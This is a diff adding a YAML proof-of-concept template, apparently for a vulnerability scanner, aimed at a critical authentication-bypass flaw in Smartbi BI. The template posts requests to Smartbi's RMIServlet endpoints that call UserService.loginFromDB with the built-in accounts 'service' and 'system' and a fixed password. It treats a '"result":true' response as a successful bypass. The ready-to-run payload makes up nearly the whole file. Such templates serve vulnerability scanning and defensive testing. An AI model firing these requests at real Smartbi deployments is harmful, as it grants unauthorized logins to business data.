@@ -1,0 +1,41 @@
+name: yaml-poc-smartbi-smartbi_bi-idor-CT-765607
+binding: a03945dc-1f15-40c9-9407-0c67bb880e12
+detail:
+    author: yuxiang.cai
+    links:
+        - https://www.smartbi.com.cn/patchinfo
+    vulnerability:
+        id: 1c2b1506-c4ce-4ab5-9770-42884b2dc09c
+        level: critical
+    warning: Harmless
+transport: http
+payloads:
+    payloads:
+        u0:
+            value: |
+                "service"
+        u1:
+            value: |
+                "system"
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /smartbi/vision/RMIServlet
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: |
+                className=UserService&methodName=loginFromDB&params=["{{value}}","0a"]
+        expression: response.body_string.contains('"result":true')
+    r1:
+        request:
+            cache: true
+            method: POST
+            path: /vision/RMIServlet
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: |
+                className=UserService&methodName=loginFromDB&params=["{{value}}","0a"]
+        expression: response.body_string.contains('"result":true')
+expression: r0() || r1()
